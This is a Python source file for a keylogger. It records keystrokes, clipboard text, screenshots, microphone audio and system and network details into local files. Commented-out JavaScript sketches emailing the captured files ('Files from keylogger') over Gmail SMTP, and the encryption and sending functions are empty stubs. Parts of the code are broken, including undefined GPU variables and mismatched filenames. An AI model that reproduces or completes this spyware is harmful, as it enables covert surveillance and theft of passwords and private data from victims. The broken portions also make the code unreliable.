# imports
from pynput.keyboard import Key, Listener
import wave
import os
import sounddevice as sd
from scipy.io.wavfile import write
from tkinter import Tk
import pyscreenshot
import platform
import psutil
import GPUtil
import socket
import time, datetime

Time = datetime.datetime.now()
stoppingTime = Time + datetime.timedelta(seconds=20)

filePath: list = [
    "clipboard_file.txt",
    "systemInformation_file.txt",
    "keyboard_file.txt"
]

# copying of clipboard textn
def clipboard_func():
    data = Tk().clipboard_get()
    file1 = open('clipboard_file.txt', "a")
    file1.write(data)
    file1.close()


# taking screenshot
def screenshot_func():
    image = pyscreenshot.grab()
    image.save("./screenshot.jpg", "JPEG")
    # image.show()


# recording audio
def sound():
    fs = 48000
    sd.default.samplerate = fs
    sd.default.channels = 2
    duration = 20
    myrecording = sd.rec(int(duration * fs))
    sd.wait()
    sd.play(myrecording)
    write("soundrecord.wav", fs, myrecording)

# getting the system version and info


def system_Data():
    # getting disk info
    partitions = psutil.disk_partitions()
    for partition in partitions:
        try:
            partition_usage = psutil.disk_usage(partition.mountpoint)
        except PermissionError:
            continue
        ROM_space = partition_usage.total
    # getting network info
    addrs = psutil.net_if_addrs()
    for interface_addrs in addrs.items():
        for address in interface_addrs:
            if str(address.family) == "AddressFamily.AF_INET":
                IP_Address = address.address
                Netmask = address.netmask
                BroadcastIP = address.broadcast
            elif str(address.family) == "AddressFamily.AF_PACKET":
                IP_Address = address.address
                Netmask = address.netmask
                BroadcastIP = address.broadcast
    # getting gpu info
    gpus: list = GPUtil.getGPUs()
    for gpu in gpus:
        try:
            gpu_name = gpu.name
            gpu_memory = gpu.memoryTotal
        except:
            continue
    body = f'''
    ==== The System Information ====\n

    Computer Name : {platform.node()}\n
    Machine Type: {platform.machine()}\n
    Processor : {platform.processor()}\n
    Processor Speed : {psutil.cpu_freq().current / 1000}\n
    Operating System: {platform.system()} {platform.release()}; version : {platform.version()}\n
    Total RAM Installed: {round(psutil.virtual_memory().total/1000000000, 2)} GB\n
    Total RAM Installed: {round(ROM_space/1000000000)} GB\n
    Ip address: {IP_Address}\n
    Netmask: {Netmask}\n
    BroadcastIp : {BroadcastIP}\n
    Installed GPU : {age_name if gpus != []  else 'No GPU found'}
    GPU memory: {age_memory if gpus != [] else 'No GPU found'}
    '''
    file1 = open('system_Information.txt', 'a')
    file1.write(body)
    file1.close()

# creatin my keyboard listener
def onPress(key):
    if key == Key.esc:
        return False
    try:
        k = key.char
    except:
        k = key.name
        if k == "space":
            k = " "
    file1 = open('keyboard_file.txt', "a")
    file1.write(k)
    file1.close()


def onRelease(key):
    if (key == Key.esc):
        return False
    if (datetime.datetime.now()  > stoppingTime ):
        return False

with Listener(on_press=onPress, on_release=onRelease) as listener:
    listener.join()

# encrypting my files
def Encrypt(file):
    print("")

# decrypting the files


def Decrypt(file):
    print("")

# clear files content


def clearContent(file):
    print("")

# email setup
# smtpConfig = {
#   host: "smtp.gmail.com",
#   port: 465,
#   secure: true, # use SSL
#   auth: {
#     "user": "username",
#     "pass": "emailPass",
#   },
# };
# mail = nodemailer.createTransport(smtpConfig);

# adding the files
# mailOptions = {
#   "from": username,
#   to: username,
#   subject: "Files from keylogger",
#   text: "That was easy",
#   attachments: [
#     {
#       path: ".keyboard_file.txt",
#     },
#     {
#       path: ".clipboard_file.txt",
#     },
#     {
#       path: ".systemInformation-file.txt",
#     },
#     {
#       path: ".soundrecord_file.wav",
#     },
#     {
#       path: ".screenshot2.png",
#     },
#   ],
# };

# sending the mail


def sendMails():
    print("")
# filePath.forEach(Decrypt)

#   mail.sendMail(mailOptions, (err, info) => {
#     if (err) console.log(err);
#     else {
#       console.log("Email sent: " + info.response)
#       filePath.forEach(clearContent)
#     }
#   })
# }

# setInterval(() => {
#   if (count < 2) {
#     screenshot_func();
#     clipboard_func();
#   }

#   if (count == 2) {
#     console.log("counts 2")
#     filePath.forEach(Encrypt)
#     setTimeout(() => {
#       sendMails();
#     }, 10)

#   }
#   count += 1;
# }, 10000);


clipboard_func()
screenshot_func()
sound()
system_Data()
print("working")
